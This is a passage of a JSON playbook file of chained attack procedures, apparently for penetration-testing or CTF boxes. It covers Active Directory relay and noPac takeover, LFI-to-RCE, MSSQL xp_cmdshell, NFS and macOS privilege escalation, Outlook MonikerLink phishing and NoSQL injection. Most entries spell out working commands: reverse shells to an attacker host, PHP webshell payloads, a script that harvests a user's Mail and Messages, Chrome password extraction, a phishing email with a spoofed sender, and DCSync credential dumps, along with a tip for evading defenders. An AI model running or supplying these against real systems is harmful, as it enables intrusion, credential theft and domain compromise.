          "notes": "Output:\n  LDAP signing NOT enforced — green light, signing relay viable.\n  LDAP signing enforced — must use LDAPS (TLS) channel binding bypass.\n"
        },
        {
          "id": "start_listener",
          "name": "Start ntlmrelayx with shadow-credentials",
          "command_ref": "ntlmrelayx-ldaps",
          "inputs": {
            "ip": "${dc_ip}"
          },
          "notes": "Use the LDAPS variant (channel binding not enforced by default at\nServer <= 2016). The `--shadow-credentials` flag tells the script\nto write msDS-KeyCredentialLink on relay success.\nFull command:\n  impacket-ntlmrelayx -t ldaps://<dc> --shadow-credentials \\\n    --shadow-target '<target_principal>'\n"
        },
        {
          "id": "coerce",
          "name": "Coerce a victim to authenticate to your relay",
          "command_ref": "coercer",
          "inputs": {
            "listener_ip": "${listener_ip}",
            "target_ip": "${dc_ip}"
          },
          "notes": "Pick a high-priv victim:\n  - DC itself (DC$ → has GenericAll on most objects).\n  - A server you don't have access to (its machine account writes to itself).\nCoercer tries PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce — one\nusually lands.\n"
        },
        {
          "id": "capture_pfx",
          "name": "Capture the PFX from ntlmrelayx output",
          "inline_command": "# Look in the ntlmrelayx terminal for:\n# [+] Saved PFX (#PKCS12) certificate to <target>.pfx",
          "capture": [
            {
              "var": "relayed_pfx",
              "regex": "Saved PFX [^\n]*to (\\S+\\.pfx)",
              "match": "first"
            }
          ]
        },
        {
          "id": "pkinit_auth",
          "name": "Authenticate as the target via PKINIT",
          "command_ref": "certipy-auth",
          "requires": [
            "relayed_pfx"
          ],
          "inputs": {
            "pfx_file": "${relayed_pfx}",
            "ip": "${dc_ip}"
          },
          "capture": [
            {
              "var": "target_nt_hash",
              "regex": "(?:NT hash|Got hash for[^:]+):[^a-f0-9]*([a-f0-9]{32})",
              "match": "first"
            }
          ]
        },
        {
          "id": "domain_takeover",
          "name": "Use the NT hash → DCSync if target was DC",
          "inline_command": "impacket-secretsdump -hashes ':<hash>' '<domain>/<target>@<dc-ip>' -just-dc",
          "inputs": {
            "hash": "${target_nt_hash}",
            "dc-ip": "${dc_ip}"
          },
          "notes": "DC machine accounts (DC01$) hold DCSync rights — using the NT hash\nwith secretsdump's -just-dc dumps every credential in the domain.\n"
        }
      ],
      "references": [
        {
          "title": "Shadow Credentials via NTLM relay",
          "url": "https://www.thehacker.recipes/ad/movement/credentials/shadow-credentials"
        },
        {
          "title": "PetitPotam",
          "url": "https://github.com/topotam/PetitPotam"
        }
      ],
      "next_chains": [
        {
          "chain": "ad-persistence-golden-ticket",
          "when": "krbtgt hash captured",
          "reason": "krbtgt → Golden Ticket persistence."
        },
        {
          "chain": "pth-lateral-spread",
          "when": "NTLM hashes captured",
          "reason": "Spread the new identities."
        }
      ]
    },
    {
      "id": "lfi-to-rce-log-poison",
      "name": "Web → Shell — LFI + log poisoning → RCE",
      "description": "Local File Inclusion in PHP/JSP apps lets you read arbitrary files. The classic upgrade to RCE: write PHP code into a log the web server controls, then include the log via LFI. Works on Apache access.log, /proc/self/environ, mail logs, session files.\n",
      "tags": [
        "web",
        "lfi",
        "log-poisoning",
        "rce",
        "php"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "target_url",
          "description": "Vulnerable URL with the LFI parameter, e.g. http://target/index.php?page=",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "confirm_lfi",
          "name": "Confirm LFI (read a known file)",
          "inline_command": "curl -s '<url>../../../../etc/passwd' | head -10",
          "inputs": {
            "url": "${target_url}"
          },
          "notes": "Try `../../../../etc/passwd`, `/etc/passwd`, `php://filter/convert.base64-encode/resource=index.php`.\nThe php://filter trick gives you source — read every script to find\ncredentials, db config, and other endpoints.\n"
        },
        {
          "id": "php_wrapper_check",
          "name": "Check for PHP wrappers",
          "inline_command": "curl -s '<url>php://filter/convert.base64-encode/resource=index.php' | base64 -d\ncurl -s -d '<?php system($_GET[\"c\"]); ?>' '<url>php://input&c=id'\ncurl -s '<url>data:text/plain,<?php phpinfo(); ?>'\n",
          "inputs": {
            "url": "${target_url}"
          },
          "notes": "php://input + data:// often give straight RCE without log poisoning.\nTry these first — much cleaner.\n"
        },
        {
          "id": "log_poison",
          "name": "Poison Apache access.log (User-Agent injection)",
          "inline_command": "curl -A '<?php system($_GET[\"c\"]); ?>' '<base_url>'",
          "inputs": {
            "base_url": "${target_url}"
          },
          "notes": "Sets User-Agent to PHP code; Apache writes it verbatim into the log.\nDefault log paths: /var/log/apache2/access.log, /var/log/httpd/access_log,\n/var/log/nginx/access.log.\n"
        },
        {
          "id": "trigger_inclusion",
          "name": "Include the poisoned log to execute",
          "inline_command": "curl '<url>../../../../var/log/apache2/access.log&c=id'",
          "inputs": {
            "url": "${target_url}"
          },
          "notes": "Output: `uid=33(www-data)...` interspersed with log lines. If you see\nit — RCE confirmed. Now drop a reverse shell:\n  c=bash -c 'bash -i >& /dev/tcp/<lhost>/<lport> 0>&1'  (URL-encode!)\n"
        },
        {
          "id": "stable_shell",
          "name": "Upgrade to a reverse shell",
          "inline_command": "curl '<url>../../../../var/log/apache2/access.log&c=$(python3 -c \"import socket,os,pty; s=socket.socket(); s.connect((\\\"<lhost>\\\",<lport>)); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(\\\"/bin/bash\\\")\")'",
          "inputs": {
            "url": "${target_url}",
            "lhost": "${attacker_ip}",
            "lport": "4444"
          },
          "notes": "Catch with `nc -lvnp <lport>` then stabilize (CTRL+Z, stty raw -echo;\nfg, export TERM=xterm).\n"
        }
      ],
      "references": [
        {
          "title": "HackTricks — LFI / RFI",
          "url": "https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html"
        },
        {
          "title": "PHP wrappers",
          "url": "https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-php-filters.html"
        }
      ],
      "next_chains": [
        {
          "chain": "shell-stabilization",
          "when": "reverse shell received",
          "reason": "Stabilize before doing anything else."
        },
        {
          "chain": "linux-priv-esc-recon",
          "when": "shell on Linux web server",
          "reason": "www-data → escalate to root."
        }
      ]
    },
    {
      "id": "linux-priv-esc-recon",
      "name": "Linux PE — recon (linpeas/lse/pspy)",
      "description": "Once you land a non-root shell on a Linux box, run the standard three enumeration sweeps and read their output with intent — not just glance. Captures the four most common privesc primitives (SUID, sudo, capabilities, writable cron) and pushes them to the board.\n",
      "tags": [
        "linux",
        "priv-esc",
        "recon",
        "post-exploitation"
      ],
      "difficulty": "easy",
      "inputs": [
        {
          "name": "target_ip",
          "source": "target_context.ip"
        }
      ],
      "steps": [
        {
          "id": "hostinfo",
          "name": "Quick host info (kernel, distro, who you are)",
          "inline_command": "id; uname -a; cat /etc/os-release; whoami; groups",
          "notes": "Old kernel + glibc → check DirtyCow / DirtyPipe / OverlayFS.\nMembership in `docker`, `lxd`, `disk`, `adm` is free privesc.\n"
        },
        {
          "id": "sudo_rights",
          "name": "What you can sudo (no password / specific binaries)",
          "inline_command": "sudo -n -l 2>/dev/null; sudo -l",
          "notes": "Anything in the list → check sudo-gtfobins-escalation chain.\n",
          "capture": [
            {
              "var": "sudo_allowed",
              "regex": "\\(([A-Za-z0-9_:,!]+)\\)\\s+(?:NOPASSWD:\\s+)?(.+)$",
              "match": "all",
              "groups": {
                "as": 1,
                "command": 2
              }
            }
          ]
        },
        {
          "id": "suid",
          "name": "SUID binaries (uid=0 by setuid)",
          "inline_command": "find / -perm -4000 -type f 2>/dev/null",
          "capture": [
            {
              "var": "suid_binaries",
              "regex": "^(/[^\\s]+)$",
              "match": "all"
            }
          ]
        },
        {
          "id": "capabilities",
          "name": "File capabilities",
          "inline_command": "getcap -r / 2>/dev/null",
          "notes": "cap_setuid+ep / cap_dac_read_search+ep / cap_chown+ep → priv esc.\nCross-reference with GTFOBins capabilities section.\n"
        },
        {
          "id": "linpeas",
          "name": "linpeas (full sweep) — review findings tagged in red/yellow",
          "inline_command": "curl -fsSL https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/linPEAS/linpeas.sh | sh",
          "notes": "Heavy but worth it. Pay attention to: writable /etc/passwd-/shadow,\nwritable PATH dirs, cron jobs hitting writable scripts, unusual\nprocesses (pspy candidate), kernel CVEs section.\n"
        },
        {
          "id": "pspy",
          "name": "pspy — watch background processes (catch cron)",
          "inline_command": "curl -fsSL https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -o /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy -p -f",
          "notes": "Run for a few minutes. Any cron job that wraps a writable script in\na writable directory = privesc.\n"
        }
      ],
      "references": [
        {
          "title": "GTFOBins",
          "url": "https://gtfobins.github.io/"
        },
        {
          "title": "HackTricks — Linux PE",
          "url": "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html"
        }
      ],
      "next_chains": [
        {
          "chain": "sudo-gtfobins-escalation",
          "when": "sudo_allowed populated",
          "reason": "sudo -l returned anything → GTFOBins lookup."
        },
        {
          "chain": "suid-binary-escalation",
          "when": "suid_binaries populated",
          "reason": "SUID binaries → check each against GTFOBins."
        },
        {
          "chain": "docker-breakout",
          "when": "user is in docker or lxd group",
          "reason": "Group membership = root."
        }
      ]
    },
    {
      "id": "macos-tcc-bypass",
      "name": "macOS — TCC bypass + SUID helper abuse",
      "description": "macOS TCC (Transparency, Consent, and Control) gates access to camera, mic, Documents, etc. Common bypasses target the per-user TCC.db (writable in some configs), inherit consent via cross-process trickery, or piggy-back on already-consented apps (Terminal, iTerm).\n",
      "tags": [
        "macos",
        "priv-esc",
        "tcc",
        "classic-macos"
      ],
      "difficulty": "medium",
      "inputs": [],
      "steps": [
        {
          "id": "macos_recon",
          "name": "macOS recon",
          "inline_command": "sw_vers\nwhoami; groups; id\ncsrutil status  # SIP on/off — SIP-off makes most attacks trivial\nls -la /Applications | grep -v '^d'  # SUID-flagged custom apps\n"
        },
        {
          "id": "list_tcc_grants",
          "name": "Inspect TCC.db (user-level — sometimes user-writable)",
          "inline_command": "sqlite3 ~/Library/Application\\ Support/com.apple.TCC/TCC.db \\\n  \"SELECT service, client, allowed FROM access;\"\n"
        },
        {
          "id": "piggyback_terminal",
          "name": "Piggyback already-consented Terminal (most common path)",
          "inline_command": "# If Terminal has Full Disk Access (most devs grant it), any process\n# the user starts from Terminal inherits the consent.\n# Drop a payload that the user will run from Terminal:\ncat > /tmp/innocent.sh <<'EOF'\n#!/bin/bash\ncp -R ~/Library/Mail /tmp/.harvest/Mail 2>/dev/null\ncp -R ~/Library/Messages /tmp/.harvest/Messages 2>/dev/null\n# etc.\nEOF\nchmod +x /tmp/innocent.sh\n"
        },
        {
          "id": "chrome_keychain",
          "name": "Read browser Keychain (no TCC if you have the user's login pwd)",
          "inline_command": "security find-generic-password -ga 'Chrome Safe Storage' -w\n# Use the returned key to decrypt Chrome's Login Data sqlite:\npython3 -c '\nimport sqlite3, sys, os\nconn = sqlite3.connect(os.path.expanduser(\"~/Library/Application Support/Google/Chrome/Default/Login Data\"))\nfor row in conn.execute(\"SELECT origin_url, username_value, password_value FROM logins\"):\n    print(row[0], row[1], row[2])'\n"
        },
        {
          "id": "dscl_groups",
          "name": "macOS-specific privesc — admin group + sudo",
          "inline_command": "dscl . -read /Groups/admin GroupMembership\nsudo -l 2>/dev/null\n# If your user is in `admin`, `sudo -s` after entering password = root.\n# If sudoers has NOPASSWD on /usr/sbin/installer → install signed pkg\n# → root code execution.\n"
        },
        {
          "id": "kext_or_root_helper",
          "name": "Custom SUID helpers (look in /Applications, /Library)",
          "inline_command": "find /Applications /Library -perm -4000 -type f 2>/dev/null\n# Many legacy apps ship SUID-root helpers in /Applications/*.app/Contents/.\n# Audit them as you would a Linux SUID — strings, ltrace alternative is\n# `dtruss -f -t open <binary>` or DTrace probes.\n"
        },
        {
          "id": "full_disk_access_bypass",
          "name": "Bypass Full Disk Access (TCCPlus / external drive trick)",
          "inline_command": "# 1) Mount an external drive: cp ~/Library to /Volumes/USB/Library\n# 2) macOS doesn't apply TCC to external volumes by default.\n# 3) Read the copied DB freely.\n"
        }
      ],
      "references": [
        {
          "title": "Csaba Fitzl — TCC bypasses",
          "url": "https://theevilbit.github.io/posts/macos_tcc_dance_with_the_devil/"
        },
        {
          "title": "Objective-See — macOS attacker tooling",
          "url": "https://objective-see.org/blog.html"
        }
      ],
      "next_chains": [
        {
          "chain": "shell-stabilization",
          "when": "shell needs cleanup",
          "reason": "macOS reverse shells need the same TTY upgrade."
        }
      ]
    },
    {
      "id": "monikerlink-cve-2024-21413",
      "name": "Phishing — MonikerLink (CVE-2024-21413) Outlook NTLM/RCE",
      "description": "Outlook's protocol handler accepts file:// URLs prefixed with `!` (`file:///\\\\attacker\\share\\evil.rtf!something`) — Outlook fetches the remote file via SMB AND opens it in Word, bypassing Protected View. Free NTLM leak + bonus Word-render RCE if you have a working exploit.\n",
      "tags": [
        "phishing",
        "outlook",
        "monikerlink",
        "cve-2024-21413",
        "ntlm-leak",
        "initial-access"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "target_email",
          "required": true
        },
        {
          "name": "listener_ip",
          "description": "Your attacker IP — SMB share + Responder.",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "prepare_smb_share",
          "name": "Stage a malicious RTF on your SMB share",
          "inline_command": "cat > /tmp/share/evil.rtf <<'EOF'\n{\\rtf1\\ansi\n[...RTF content... can include an OLE Word vulnerability payload here...]\n}\nEOF\nimpacket-smbserver share /tmp/share -smb2support -username '' -password ''\n",
          "notes": "Even an empty RTF still triggers the NTLM leak — the auth happens\nBEFORE the content is rendered.\n"
        },
        {
          "id": "start_responder",
          "name": "Start Responder for SMB auth capture",
          "inline_command": "sudo responder -I tun0 -A",
          "notes": "`-A` enables auth-only mode (faster). The leak lands as NTLMv2 in\nSMB-NTLMv2-SSP-*.txt.\n"
        },
        {
          "id": "craft_email",
          "name": "Craft the email with the moniker link",
          "inline_command": "# Embed the link in body or attachment; the moniker syntax is:\n#   file:///\\\\<attacker_ip>\\share\\evil.rtf!something\n# As clickable HTML:\n#   <a href=\"file:///\\\\<attacker>\\share\\evil.rtf!any\">click</a>\nswaks --server '<smtp>' --to '<email>' \\\n  --from 'noreply@cdn-cache.com' \\\n  --header 'Content-Type: text/html' \\\n  --body '<html><body><a href=\"file:///\\\\<listener>\\share\\evil.rtf!x\">View quarterly report</a></body></html>'\n",
          "inputs": {
            "smtp": "<smtp_server>",
            "email": "${target_email}",
            "listener": "${listener_ip}"
          }
        },
        {
          "id": "wait_for_click",
          "name": "Wait for the click → NTLM in Responder",
          "inline_command": "tail -f /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt",
          "capture": [
            {
              "var": "ntlmv2_hash",
              "regex": "^([^:]+::[^:]+:[a-f0-9]{16}:[a-f0-9]{32}:[A-Za-z0-9+/=]+)$",
              "match": "first"
            }
          ]
        },
        {
          "id": "crack_or_relay",
          "name": "Crack the NTLMv2 OR relay to LDAPS",
          "branch": [
            {
              "when": "ntlmv2_hash",
              "label": "Crack offline (have time, want plaintext)",
              "command_ref": "hashcat-ntlmv2"
            },
            {
              "when": "ntlmv2_hash",
              "label": "Relay to LDAPS (no signing → Shadow Cred takeover)",
              "command_ref": "ntlmrelayx-ldaps"
            }
          ]
        }
      ],
      "references": [
        {
          "title": "MonikerLink — Check Point write-up",
          "url": "https://research.checkpoint.com/2024/the-risks-of-the-monikerlink-bug-in-microsoft-outlook-and-the-big-picture/"
        },
        {
          "title": "Microsoft advisory CVE-2024-21413",
          "url": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-21413"
        }
      ],
      "next_chains": [
        {
          "chain": "ldap-relay-shadow-cred",
          "when": "NTLMv2 captured AND LDAPS reachable",
          "reason": "Relay → KeyCredentialLink takeover."
        },
        {
          "chain": "password-spray",
          "when": "plaintext cracked",
          "reason": "Spray for Pwn3d! hosts."
        }
      ]
    },
    {
      "id": "mssql-impersonation-chain",
      "name": "Lateral — MSSQL login → impersonate → xp_cmdshell → shell",
      "description": "MSSQL is the most under-defended foothold on AD networks. With any login, enumerate impersonation rights and linked servers, walk the trust graph, enable xp_cmdshell and pop a SYSTEM/svc shell.\n",
      "tags": [
        "mssql",
        "lateral-movement",
        "impersonation",
        "xp_cmdshell"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "target_ip",
          "source": "target_context.ip",
          "required": true
        },
        {
          "name": "user",
          "source": "target_context.user",
          "required": true
        },
        {
          "name": "password",
          "source": "target_context.password"
        }
      ],
      "steps": [
        {
          "id": "probe",
          "name": "Confirm auth + privilege check",
          "command_ref": "nxc-mssql-priv",
          "inputs": {
            "ip": "${target_ip}",
            "user": "${user}",
            "password": "${password}"
          },
          "notes": "`IsSysadmin`, `IsDBOwner`, `HasPrivilege` lines are gold.\n"
        },
        {
          "id": "impersonate",
          "name": "Find IMPERSONATE rights (EXECUTE AS)",
          "command_ref": "nxc-mssql-enum-impersonate",
          "inputs": {
            "ip": "${target_ip}",
            "user": "${user}",
            "password": "${password}"
          },
          "notes": "If a low-priv login can EXECUTE AS sa, that's sysadmin via one line:\n`EXECUTE AS LOGIN = 'sa'; SELECT IS_SRVROLEMEMBER('sysadmin');`\n"
        },
        {
          "id": "linked_servers",
          "name": "Linked-server graph",
          "command_ref": "nxc-mssql-enum-links",
          "inputs": {
            "ip": "${target_ip}",
            "user": "${user}",
            "password": "${password}"
          },
          "notes": "Walk linked servers with `EXEC ('xp_cmdshell ...') AT [LINKED]`. Often\nthe linked server is sysadmin even when the source isn't.\n"
        },
        {
          "id": "enable_xpcmdshell",
          "name": "Enable xp_cmdshell (requires sysadmin)",
          "command_ref": "nxc-mssql-enable-cmdshell",
          "inputs": {
            "ip": "${target_ip}",
            "user": "${user}",
            "password": "${password}"
          },
          "notes": "sp_configure 'show advanced options', 1; reconfigure;\nsp_configure 'xp_cmdshell', 1; reconfigure;\nRemember to turn it back off after — defenders watch for it.\n"
        },
        {
          "id": "shell_via_xpcmdshell",
          "name": "Trigger a reverse shell via xp_cmdshell",
          "command_ref": "nxc-mssql-xpcmdshell",
          "inputs": {
            "ip": "${target_ip}",
            "user": "${user}",
            "password": "${password}"
          },
          "notes": "Pair with a Mission Control payload from commands/payloads/\n(`rsg-reverseshell-powershell-payload` or a PowerShell base64\none-liner). The MSSQL service usually runs as a domain svc account\n— that account often has SeImpersonatePrivilege → Potato → SYSTEM.\n"
        }
      ],
      "references": [
        {
          "title": "The Hacker Recipes — MSSQL",
          "url": "https://www.thehacker.recipes/ad/movement/mssql"
        },
        {
          "title": "NetExec — MSSQL",
          "url": "https://www.netexec.wiki/mssql-protocol"
        }
      ],
      "next_chains": [
        {
          "chain": "windows-priv-esc-recon",
          "when": "shell returned",
          "reason": "On the box — sweep for privesc."
        },
        {
          "chain": "seimpersonate-potato",
          "when": "SeImpersonatePrivilege enabled",
          "reason": "SQL service accounts usually have it — instant SYSTEM."
        }
      ]
    },
    {
      "id": "nfs-no-root-squash",
      "name": "Linux PE — NFS no_root_squash → SUID drop → root",
      "description": "An exported NFS share with `no_root_squash` (or `no_all_squash`) lets a root-mounted client write files owned by uid 0 on the remote filesystem. Drop a SUID binary, run it on the target, root.\n",
      "tags": [
        "linux",
        "priv-esc",
        "nfs",
        "classic-linux"
      ],
      "difficulty": "easy",
      "inputs": [
        {
          "name": "target_ip",
          "description": "NFS server IP.",
          "source": "target_context.ip",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "enum_shares",
          "name": "Enumerate exports",
          "inline_command": "showmount -e <ip>",
          "inputs": {
            "ip": "${target_ip}"
          },
          "notes": "Look for `/something *` (no host restriction) and `(no_root_squash)`\nin /etc/exports on the server. The first means you can mount it from\nanywhere; the second is the privesc primitive.\n"
        },
        {
          "id": "confirm_no_root_squash",
          "command_ref": "nxc-nfs-shares",
          "inputs": {
            "ip": "${target_ip}"
          },
          "name": "Confirm no_root_squash via NetExec NFS module"
        },
        {
          "id": "mount_share",
          "name": "Mount the export locally as root",
          "inline_command": "mkdir -p /mnt/nfs\nsudo mount -t nfs <ip>:/path/to/share /mnt/nfs -o nolock\nls -la /mnt/nfs\n",
          "inputs": {
            "ip": "${target_ip}"
          },
          "notes": "`-o nolock` avoids the rpc.statd dance. Files inside the share now\nshow their actual owner uids — sometimes you can already read\npasswords / SSH keys without the SUID trick.\n"
        },
        {
          "id": "drop_suid",
          "name": "Compile a tiny SUID-root shell and drop it",
          "inline_command": "cat > /tmp/x.c <<'EOF'\n#include <stdio.h>\n#include <unistd.h>\nint main() { setreuid(0, 0); execve(\"/bin/sh\", NULL, NULL); return 0; }\nEOF\ngcc /tmp/x.c -o /mnt/nfs/.sh\nsudo chown root:root /mnt/nfs/.sh\nsudo chmod 4755 /mnt/nfs/.sh\n"
        },
        {
          "id": "trigger_on_target",
          "name": "Run the SUID binary on the target (any low-priv shell)",
          "inline_command": "/path/to/share/.sh -p  # -p preserves the effective UID",
          "notes": "Get a low-priv shell on the target first (SSH key from the share,\nweb RCE, anything). Then run the SUID binary you just dropped → root.\n"
        },
        {
          "id": "confirm",
          "name": "Confirm root",
          "inline_command": "id"
        }
      ],
      "references": [
        {
          "title": "HackTricks — NFS",
          "url": "https://book.hacktricks.wiki/en/network-services-pentesting/nfs-service-pentesting.html"
        },
        {
          "title": "no_root_squash explained",
          "url": "https://man7.org/linux/man-pages/man5/exports.5.html"
        }
      ],
      "next_chains": [
        {
          "chain": "shell-stabilization",
          "when": "rooted shell is messy",
          "reason": "Upgrade the new root shell."
        },
        {
          "chain": "linux-priv-esc-recon",
          "when": "pivoting to other hosts",
          "reason": "Now root — pull every secret, including SSH keys for lateral."
        }
      ]
    },
    {
      "id": "nmap-recon",
      "name": "Recon — full nmap & service fingerprint",
      "description": "First-touch recon for any HTB/OSCP box. Quick discovery scan to learn open ports, then a versioned/scripted scan only on those ports for speed and noise control. Output flows directly into the Target Board (target_ip, open_ports, services) so every downstream chain becomes context-aware.\n",
      "tags": [
        "recon",
        "nmap",
        "enumeration"
      ],
      "difficulty": "easy",
      "inputs": [
        {
          "name": "target_ip",
          "description": "IP of the box.",
          "source": "target_context.ip",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "tcp_discovery",
          "name": "Fast all-ports TCP discovery",
          "inline_command": "nmap -p- --min-rate=2000 -T4 -oN tcp-ports.nmap <ip>",
          "notes": "`-p-` covers the full 1-65535 range. Tune `--min-rate` down on flaky\nnetworks or up on CTFs. The output drives the auto-extract parser\nwhich populates target_ip + open_ports on the board.\n",
          "inputs": {
            "ip": "${target_ip}"
          },
          "capture": [
            {
              "var": "open_ports",
              "regex": "^(\\d{1,5})/(?:tcp|udp)\\s+open",
              "match": "all"
            }
          ]
        },
        {
          "id": "versioned_scan",
          "name": "Versioned scan + default scripts on open ports",
          "inline_command": "nmap -sC -sV -p <ports> -oN versioned.nmap <ip>",
          "requires": [
            "open_ports"
          ],
          "inputs": {
            "ip": "${target_ip}",
            "ports": "${open_ports}"
          },
          "notes": "Now that we know what's open, get banners and run NSE default\nscripts. Look for: SMB signing, LDAP base DNs, Kerberos realm hints,\nRPC interfaces, web tech stacks, DB versions.\n"
        },
        {
          "id": "udp_top_100",
          "name": "UDP top-100 (slow but worth it)",
          "inline_command": "sudo nmap -sU --top-ports 100 -oN udp-top100.nmap <ip>",
          "inputs": {
            "ip": "${target_ip}"
          },
          "notes": "Skip on time-pressed CTFs unless DNS/SNMP/IKE/etc. show up later.\nDNS (53), SNMP (161), and IKE (500) regularly hide initial access.\n"
        }
      ],
      "references": [
        {
          "title": "Nmap NSE script docs",
          "url": "https://nmap.org/nsedoc/"
        },
        {
          "title": "HackTricks — Pentesting Methodology",
          "url": "https://book.hacktricks.wiki/en/generic-methodologies-and-resources/pentesting-methodology.html"
        }
      ],
      "next_chains": [
        {
          "chain": "smb-null-session-enum",
          "when": "open_ports includes 445 or 139",
          "reason": "SMB open → null-session enum first."
        },
        {
          "chain": "ldap-anonymous-enum",
          "when": "open_ports includes 389 or 636",
          "reason": "LDAP/AD detected — walk the directory."
        },
        {
          "chain": "mssql-impersonation-chain",
          "when": "open_ports includes 1433",
          "reason": "MSSQL is open and almost always exploitable."
        },
        {
          "chain": "shell-stabilization",
          "reason": "Keep in reach — needed the moment any service yields a shell."
        }
      ]
    },
    {
      "id": "nopac-cve-2021-42278",
      "name": "AD — noPac / sAMAccountName spoof (CVE-2021-42278/42287)",
      "description": "Pre-November-2021 Active Directory let any user with MachineAccountQuota>0 create a computer object, then rename it to a DC's sAMAccountName without the trailing $. The KDC issues TGS-as-Administrator to that \"new DC\" = instant domain takeover.\n",
      "tags": [
        "nopac",
        "sam-the-admin",
        "cve-2021-42278",
        "cve-2021-42287",
        "priv-esc"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "dc_ip",
          "source": "target_context.ip",
          "required": true
        },
        {
          "name": "domain",
          "source": "target_context.domain",
          "required": true
        },
        {
          "name": "user",
          "source": "target_context.user",
          "required": true
        },
        {
          "name": "password",
          "source": "target_context.password",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "vuln_check",
          "name": "Confirm vulnerability",
          "command_ref": "nxc-smb-nopac",
          "inputs": {
            "ip": "${dc_ip}",
            "user": "${user}",
            "password": "${password}"
          }
        },
        {
          "id": "detonate",
          "name": "Run the noPac exploit (impacket-fork)",
          "inline_command": "git clone https://github.com/Ridter/noPac /tmp/nopac; python3 /tmp/nopac/noPac.py '<domain>'/'<user>':'<password>' -dc-ip <dc-ip> -shell --impersonate administrator",
          "inputs": {
            "dc-ip": "${dc_ip}",
            "domain": "${domain}",
            "user": "${user}",
            "password": "${password}"
          },
          "notes": "The exploit adds a temporary computer, swaps its sAMAccountName,\nrequests a TGS as Administrator and drops you into a psexec shell\nas NT AUTHORITY\\\\SYSTEM. Some implementations also offer\n`--dump-creds` to skip straight to DCSync output.\n"
        },
        {
          "id": "dcsync_directly",
          "name": "Or skip the shell: dump straight from the TGT",
          "inline_command": "python3 /tmp/nopac/noPac.py '<domain>'/'<user>':'<password>' -dc-ip <dc-ip> --impersonate administrator --dump",
          "inputs": {
            "dc-ip": "${dc_ip}",
            "domain": "${domain}",
            "user": "${user}",
            "password": "${password}"
          },
          "capture": [
            {
              "var": "dc_nt_hash",
              "regex": "^Administrator:500:[a-f0-9]{32}:([a-f0-9]{32}):::",
              "match": "first"
            },
            {
              "var": "krbtgt_nt_hash",
              "regex": "^krbtgt:502:[a-f0-9]{32}:([a-f0-9]{32}):::",
              "match": "first"
            }
          ]
        }
      ],
      "references": [
        {
          "title": "noPac (Ridter)",
          "url": "https://github.com/Ridter/noPac"
        },
        {
          "title": "Charlie Clark's noPac writeup",
          "url": "https://exploit.ph/exploiting-cve-2021-42278-and-cve-2021-42287.html"
        }
      ],
      "next_chains": [
        {
          "chain": "ad-persistence-golden-ticket",
          "when": "krbtgt_nt_hash captured",
          "reason": "krbtgt → Golden Ticket."
        },
        {
          "chain": "pth-lateral-spread",
          "when": "dc_nt_hash captured",
          "reason": "Spread with the DA hash."
        }
      ]
    },
    {
      "id": "nosql-injection",
      "name": "Web — NoSQL injection (MongoDB / similar)",
      "description": "Login forms that pass query parameters directly into a MongoDB `find()` call without sanitization. `{$ne: ''}` style operator injection bypasses auth; `$regex` lets you boolean-blind dump every field character by character.\n",
      "tags": [
        "web",
        "nosql",
        "mongodb",
        "auth-bypass",
        "injection"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "target_url",
          "description": "Vulnerable login endpoint.",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "confirm",
          "name": "Confirm NoSQL injection (auth bypass)",
          "inline_command": "# Operator injection via JSON body:\ncurl -X POST '<url>' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"username\":\"admin\",\"password\":{\"$ne\":\"x\"}}'\n# Via form-encoded with [bracket] syntax:\ncurl -X POST '<url>' \\\n  -d 'username=admin&password[$ne]=x'\n",
          "inputs": {
            "url": "${target_url}"
          },
          "notes": "Either path sends `{password: {$ne: 'x'}}` to Mongo. If the app\nlogs you in (or returns a session cookie) → vulnerable.\n"
        },
        {
          "id": "enumerate_users",
          "name": "Enumerate valid usernames via $regex",
          "inline_command": "# Returns 200/redirect when username starts with the regex match:\ncurl -X POST '<url>' \\\n  -d 'username[$regex]=^a&password[$ne]=x' -o /dev/null -w '%{http_code}\\n'\n# Loop a-z, then expand the prefix iteratively.\n"
        },
        {
          "id": "extract_password",
          "name": "Boolean-blind dump the admin's password",
          "inline_command": "# Mongo query: {username: 'admin', password: {$regex: '^X.*'}}\n# Loop char by char:\nfor c in {a..z} {A..Z} {0..9} '!' '@' '#' '$'; do\n  code=$(curl -s -o /dev/null -w '%{http_code}' -X POST '<url>' \\\n    -d \"username=admin&password[\\$regex]=^X$c.*\")\n  echo \"$c → $code\"\ndone\n# Whichever returns 200/success → next char is found. Append, repeat.\n",
          "notes": "Slow but reliable. Tools like NoSQLMap or `nosqli` automate this.\n"
        },
        {
          "id": "full_dump_with_nosqlmap",
          "name": "Or skip the loop — use NoSQLMap",
          "inline_command": "git clone https://github.com/codingo/NoSQLMap /tmp/nosqlmap\ncd /tmp/nosqlmap && python3 NoSQLMap.py\n# 2) Scan Sites → enter URL → choose blind regex injection.\n"
        },
        {
          "id": "post_auth_pivot",
          "name": "Once authenticated → look for next pivot",
          "inline_command": "echo 'Authenticated session → revisit the app for admin panels, file upload, command injection, SSRF, deserialization endpoints.'"
        }
      ],
      "references": [
        {
          "title": "HackTricks — NoSQL Injection",
          "url": "https://book.hacktricks.wiki/en/pentesting-web/nosql-injection.html"
        },
        {
          "title": "PayloadsAllTheThings — NoSQL",
          "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection"
        }
      ],
      "next_chains": [
        {
          "chain": "file-upload-bypass",
          "when": "authenticated as admin",
